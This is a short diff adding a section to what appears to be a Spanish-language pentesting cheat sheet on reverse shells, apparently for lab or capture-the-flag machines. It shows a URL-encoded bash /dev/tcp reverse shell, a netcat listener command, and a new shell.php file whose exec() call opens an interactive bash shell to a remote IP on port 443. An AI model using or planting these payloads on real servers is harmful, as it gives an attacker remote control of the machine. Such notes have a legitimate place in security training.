@@ -18,3 +18,23 @@ Ejemplo: bash -c 'bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261'
 ```
 
 Mientras tenemos que estar en escucha con [[nc -nlvp 443]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Desde un archivo .php
+Creamos el archivo shell.php
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.21/443 0>&1'");
+?>
+```
